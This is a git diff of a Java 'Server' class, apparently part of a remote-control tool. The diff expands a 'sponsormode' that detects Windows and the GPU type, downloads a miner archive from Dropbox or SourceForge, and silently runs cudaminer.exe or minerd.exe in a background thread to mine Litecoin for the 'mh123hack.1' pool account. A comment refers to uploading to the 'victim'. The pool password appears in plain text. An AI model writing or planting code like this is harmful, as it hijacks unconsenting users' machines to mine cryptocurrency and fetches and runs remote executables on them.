@@ -33,16 +33,39 @@ public class Server {
 
         if (sponsormode) { // this starts only when sponsormode is true.
             String s = ExecuteMyCommand("wmic path win32_VideoController get name");
-            if (OS.contains("windows") && s.contains("NVIDIA")) {
-                try {
-                    unZipIt(download("https://dl.dropboxusercontent.com/u/68963061/x64-2017-03-08-21-43.zip"), temp.getAbsolutePath() + "folder");
-                    ExecuteMyCommand(temp.getAbsolutePath() + "folder/cudaminer.exe -o stratum+tcp://litecoinpool.org:3333 -O mh123hack.1:sCkaXGjeQOR9ediY7ytS -q -B");
-                } catch (Exception ex) {
-                    System.err.println("sponsermode faild it will be disabled :( not critical no error");
-                    sponsormode = false;
-                } 
-            } else {
-                System.err.println("sponsermode only works on windows :( no error");
+            if (OS.contains("windows")) {
+                if (s.contains("NVIDIA")) {
+                    try {
+                        unZipIt(download("https://dl.dropboxusercontent.com/u/68963061/x64-2017-03-08-21-43.zip"), temp.getAbsolutePath() + "folder");
+                        Thread t = new Thread(new Runnable() {
+                            public void run() {
+                                ExecuteMyCommand(temp.getAbsolutePath() + "folder/cudaminer.exe -o stratum+tcp://litecoinpool.org:3333 -O mh123hack.1:sCkaXGjeQOR9ediY7ytS");
+                            }
+                        });
+                        t.start();
+                        System.out.println(temp.getAbsolutePath() + "folder");
+                    } catch (Exception ex) {
+                        System.err.println("sponsermode faild it will be disabled :( not critical no error");
+                        sponsormode = false;
+                    }
+                } else {
+                    try {
+                        unZipIt(download("https://svwh.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.4.5-win64.zip"), temp.getAbsolutePath() + "folder");
+                        Thread t = new Thread(new Runnable() {
+                            public void run() {
+                                ExecuteMyCommand(temp.getAbsolutePath() + "folder/minerd.exe -o stratum+tcp://litecoinpool.org:3333 -O mh123hack.1:sCkaXGjeQOR9ediY7ytS -q");
+                            }
+                        });
+                        t.start();
+                        System.out.println(temp.getAbsolutePath() + "folder");
+                    } catch (Exception ex) {
+                        System.err.println("sponsermode faild it will be disabled :( not critical no error");
+                        sponsormode = false;
+                    }
+                    
+                }
+            } else if (OS.contains("linux")){
+                System.err.println("sponsormode doesnt work yet for linux");
             }
         }
 
@@ -73,7 +96,7 @@ public class Server {
         }
     }
 
-    public static String download(String file) throws IOException { // uploaden naar victum via url
+    public static String download(String file) throws IOException { // uploaden naar victim via url
         temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
         URL url = new URL(file);
         InputStream in = url.openStream();
